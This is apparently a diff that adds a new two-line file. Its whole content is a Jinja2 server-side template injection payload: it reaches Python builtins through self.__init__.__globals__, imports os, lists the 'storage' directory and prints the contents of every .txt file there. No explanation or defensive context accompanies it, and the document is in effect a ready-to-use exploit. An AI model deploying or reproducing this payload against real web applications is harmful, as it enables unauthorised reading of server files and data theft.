@@ -1,0 +1,2 @@
+{% for f in self.__init__.__globals__.__builtins__.__import__('os').listdir('storage') %}{% if f.endswith('.txt') %}[{{ f }}] {{ self.__init__.__globals__.__builtins__.open('storage/' ~ f).read() }}
+{% endif %}{% endfor %}
